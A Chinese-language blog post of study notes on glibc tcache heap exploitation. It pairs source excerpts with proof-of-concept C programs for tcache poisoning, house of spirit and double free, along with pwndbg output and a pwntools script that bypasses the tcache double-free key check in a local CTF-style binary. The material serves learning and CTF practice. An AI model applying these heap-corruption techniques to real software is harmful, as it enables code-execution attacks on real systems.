<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>tcachebin_attack | str1k3</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('/img/bg.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>tcachebin_attack</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2023-08-30T01:55:14.000Z" id="date"> 2023-08-30</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2023-08-30T11:24:48.236Z" id="updated"> 2023-08-30</time></div></span></div></div><hr><div id="post-content"><p><strong>about tcache</strong><br>在glibc版本2.26(可以简单记成18.04后)以后，加入了tcache(Thread Local Caching)机制</p>
<p>这里放上tcache的定义</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br><span class="hljs-comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> TCACHE_MAX_BINS        64</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> MAX_TCACHE_SIZE    tidx2usize (TCACHE_MAX_BINS-1)</span><br><br><span class="hljs-comment">/* Only used to pre-fill the tunables.  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> tidx2usize(idx)    (((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span><br><br><span class="hljs-comment">/* When &quot;x&quot; is from chunksize().  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span><br><span class="hljs-comment">/* When &quot;x&quot; is a user-provided size.  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span><br><br><span class="hljs-comment">/* With rounding and alignment, the bins are...</span><br><span class="hljs-comment">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span><br><span class="hljs-comment">   idx 1   bytes 25..40 or 13..20</span><br><span class="hljs-comment">   idx 2   bytes 41..56 or 21..28</span><br><span class="hljs-comment">   etc.  */</span><br><br><span class="hljs-comment">/* This is another arbitrary limit, which tunables can change.  Each</span><br><span class="hljs-comment">   tcache bin will hold at most this number of chunks.  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> TCACHE_FILL_COUNT 7</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure>
<p>tcache机制通过维护多个大小不同的链表来存储已被释放但尚未重新分配的堆块。每个链表对应一个特定的堆块大小，并且每个线程都有自己的tcache链表。当程序请求分配一个堆块时，tcache会首先检查是否有合适大小的空闲块可用，如果有，则直接从tcache中分配给程序。</p>
<p>tcache机制主要有三个优点：</p>
<p>减少了对全局锁的竞争：由于每个线程都有自己的tcache链表，所以线程之间不需要竞争全局锁，从而减少了锁的开销。<br>快速的内存分配和释放：由于tcache只包含已经释放但尚未重新分配的堆块，所以可以快速地进行内存分配和释放操作。<br>减少碎片化：tcache机制使得相同大小的堆块可以被重复使用，减少了堆内存的碎片化问题。</p>
<p>它为每个线程创建一个缓存，里面包含了一些小堆块。每个线程默认使用64个单链表结构的bins，每个bins最多存放7个chunk，64位机器16字节递增，从0x20到0x410，也就是说位于以上大小的chunk释放后都会先行存入到tcache_bin中。对于每个tcache_bin单链表，它和fast_bin一样都是先进后出，而且prev_inuse标记位都不会被清除，所以tcache_bin中的chunk不会被合并，即使和Top_chunk相邻。</p>
<p>  另外tcache机制出现后，每次产生堆都会先产生一个0x250大小的堆块，该堆块位于堆的开头，用于记录64个bins的地址（这些地址指向用户数据部分）以及每个bins中chunk数量。在这个0x250大小的堆块中，前0x40个字节用于记录每个bins中chunk数量，每个字节对应一条tcache_bin链的数量，从0x20开始到0x410结束，刚好64条链，然后剩下的每8字节记录一条tcache_bin链的开头地址，也是从0x20开始到0x410结束。还有一点值得注意的是，tcache_bin中的fd指针是指向malloc返回的地址，也就是用户数据部分。</p>
<p><strong>attack</strong><br><em>绕过tcache机制的方法在上一篇unsorted_bin里有说明</em></p>
<p><strong>tcache poisoning</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc how2heap2.c -g -no-pie -o tcache_bin</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-comment">// 在fck处分配堆块</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> fck;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fck addr is %p\n&quot;</span>, &amp;fck);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> * ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<span class="hljs-comment">//chunk1</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc ptr addr is %p\n&quot;</span>, ptr);<br>    <span class="hljs-built_in">free</span>(ptr);<br>    <span class="hljs-comment">// 只需修改fd指针，申请的大小和当前tcache bin大小相同即可</span><br>    ptr[<span class="hljs-number">0</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)&amp;fck;<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<span class="hljs-comment">//chunk2</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the second malloc addr is %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>攻击效果如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">pwndbg&gt; r<br>Starting program: /home/str1k3/Desktop/tcache_bin <br>fck addr is 0x7fffffffe2e8<br>malloc ptr addr is 0x602670<br>the second malloc addr is 0x7fffffffe2e8<br>[Inferior 1 (process 3147) exited normally]<br></code></pre></td></tr></table></figure>
<p>可以看到chunk2的地址被修改到了0x7fffffffe2e8。</p>
<p><strong>tcache house of spirit</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc tcache_house_of_spirit.c -g -no-pie -o tcache_house_of_spirit</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> target[<span class="hljs-number">4</span>];<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1</span>);  <span class="hljs-comment">// 初始化堆环境</span><br>    <br>    <span class="hljs-comment">// 伪造fake_chunk，试图释放后再次分配得到该地址的堆块</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;your target addr is %p\n&quot;</span>, target+<span class="hljs-number">2</span>);<br>    target[<span class="hljs-number">1</span>] = <span class="hljs-number">0x90</span>;<br>    <span class="hljs-built_in">free</span>(target+<span class="hljs-number">2</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;now malloc addr is %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>));<br>    <span class="hljs-comment">//success </span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>free完fake_chunk后的bin：</p>
<figure class="highlight plaintext"><figcaption><span>bin</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pwndbg>">tcachebins<br>0x90 [  1]: 0x7fffffffe2d0 ◂— 0x0<br></code></pre></td></tr></table></figure>
<p>成功得到位于0x7fffffffe2d0的堆块</p>
<p>该攻击关键在于构造好fake_chunk的size，以及释放堆块对应的用户数据地址</p>
<p><strong>leak_libc_base</strong><br><em>同unsorted_bin_attack</em></p>
<p><strong>leak_heap_base</strong><br><em>easy_double_free</em></p>
<p>glibc版本2.28前，没有对tcache二次释放的检查<br>因此在glibc_2.26到glibc_2.27的老版本之间<br>可以利用double_free来泄露堆基址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc double_free.c -g -no-pie -o double_free</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">free</span>(ptr);<br>    <span class="hljs-built_in">free</span>(ptr);  <span class="hljs-comment">// double free</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;heap addr is %ld\n&quot;</span>, ptr[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<p><em><strong>这个过渡版的glibc有点难找，等环境搭起来再来复现easy_double_free</strong></em></p>
<p><strong>double_free</strong><br>那么高版本的glibc能double_free吗？<br>是可以的，先看看检查机制</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span>  <span class="hljs-comment">//指向chunk的fd</span><br>  <span class="hljs-comment">/* This field exists to detect double frees.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span> *<span class="hljs-title">key</span>;</span>  <span class="hljs-comment">//指向chunk的bk</span><br>&#125; tcache_entry;<br></code></pre></td></tr></table></figure>
<p><em>对于每一个tcache都有一个key指针指向</em></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span> tc_idx = csize2tidx(size);<span class="hljs-comment">//只要tcache不为空 并且free chunk在tcache范围中 都需要进行double free检查</span><br>    <span class="hljs-keyword">if</span> (tcache != <span class="hljs-literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>    &#123;<br>      <span class="hljs-comment">/* Check to see if it&#x27;s already in the tcache.  */</span><br>      tcache_entry *e = (tcache_entry *)chunk2mem(p);<br> <br>      <span class="hljs-comment">/*</span><br><span class="hljs-comment">        如果是这个chunk已经被放入tcache 那么key字段就已经有数据了 会被识别出来</span><br><span class="hljs-comment">      */</span><br>      <span class="hljs-keyword">if</span> (__glibc_unlikely(e-&gt;key == tcache))<span class="hljs-comment">//汇报错误信息</span><br>      &#123;<br>        tcache_entry *tmp;<br>        LIBC_PROBE(memory_tcache_double_free, <span class="hljs-number">2</span>, e, tc_idx);<br>        <span class="hljs-keyword">for</span> (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next)<br>          <span class="hljs-keyword">if</span> (tmp == e)<br>            malloc_printerr(<span class="hljs-string">&quot;free(): double free detected in tcache 2&quot;</span>);<br>      &#125;<br> <br>      <span class="hljs-keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  <span class="hljs-comment">//通过检查，放入tcahce中</span><br>      &#123;<br>        tcache_put(p, tc_idx);<br>        <span class="hljs-keyword">return</span>;<br>      &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>
<p>所以 如果我们还想要使用tcache double free的话 就只能修改key字段</p>
<p>debug_exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>p = process(<span class="hljs-string">&quot;./2heap&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./2heap&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc-2.23.so&quot;)</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br>    <span class="hljs-keyword">return</span> u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,payload</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;You can customize the size of house here, but what about your life&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">b&quot;add something to your house\n&quot;</span>)<br>    p.send(payload)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;every decision you made is meaningful&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,size,payload</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;It&#x27;s never too late to make changes&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br>    p.recvuntil(<span class="hljs-string">b&quot;something interesting here&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.sendlineafter(<span class="hljs-string">b&quot;Now add something&quot;</span>,payload)<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Let&#x27;s see what you can do&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br><br><br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>debug()<br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload),payload)<br>delete(<span class="hljs-number">0</span>)<br><br>p.interactive<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">pwndbg&gt; heap<br>Allocated chunk | PREV_INUSE<br>Addr: 0xe3d000<br>Size: 0x251<br><br>Free chunk (tcachebins) | PREV_INUSE<br>Addr: 0xe3d250<br>Size: 0x21<br>fd: 0x00<br><br>Top chunk | PREV_INUSE<br>Addr: 0xe3d270<br>Size: 0x20d91<br><br>pwndbg&gt; x/4gx 0xe3d250<br>0xe3d250:	0x0000000000000000	0x0000000000000021<br>0xe3d260:	0x0000000000000000	0x0000000000e3d010<br>pwndbg&gt; x/4gx 0xe3d000<br>0xe3d000:	0x0000000000000000	0x0000000000000251<br>0xe3d010:	0x0000000000000001	0x0000000000000000<br><br></code></pre></td></tr></table></figure>
<p>可以看到所谓的key检查 也就是在tcachebin中的chunk的bk域存入tcache_perthread_struct结构体的地址</p>
<p>也就是在堆基址处0x251大小的chunk</p>
<p>跟着exp走，可以成功把处于tcachebin中的chunk的bk域清空<br>这样再次free的时候就不会触发double free</p>
<p><em>glibc2.29加入了stash机制，导致tcachebin存在与fastbin以及smallbin的‘联动’漏洞，写完fastbin和smallbin再回来补充</em><br><em><strong>前面的攻击手段，以后再来探索吧~</strong></em></p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/09/01/fastbin-attack/">← 下一篇 fastbin_attack</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/08/29/unsortedbin-attack/">unsortedbin_attack 上一篇 →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">str1k3</a></h1><div id="description"><p></p></div></div><div id="aside-block"></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>